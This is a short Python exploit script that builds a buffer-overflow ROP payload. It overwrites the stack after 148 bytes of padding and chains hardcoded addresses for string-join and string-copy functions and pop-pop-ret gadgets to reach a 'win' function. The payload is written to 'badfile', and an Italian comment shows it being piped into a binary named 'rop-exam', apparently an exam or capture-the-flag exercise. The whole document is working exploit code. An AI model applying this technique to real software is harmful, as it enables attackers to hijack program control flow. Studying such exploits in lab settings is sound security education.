import struct
import subprocess

join_string = struct.pack("I", 0x804854c)
str1 = struct.pack("I", 0x0804a060)
str2 = struct.pack("I", 0x0804a084)
str3 = struct.pack("I", 0x0804a0a0)
pop_pop_ret = struct.pack("I", 0x080486aa)
win = struct.pack("I", 0x804857e)
copy_string = struct.pack("I", 0x804851a)
argv_addr = struct.pack("I", 0xbffff57f)

p = 'A' * 148

p += join_string
p += pop_pop_ret
p += str1
p += argv_addr

p += copy_string
p += pop_pop_ret
p += str3
p += str1

p += join_string
p += pop_pop_ret
p += str3
p += str2

p += win

payload = p
with open("badfile", "wb") as f:
	f.write(payload) 


#esegui cat badfile - | ./rop-exam Carolin a
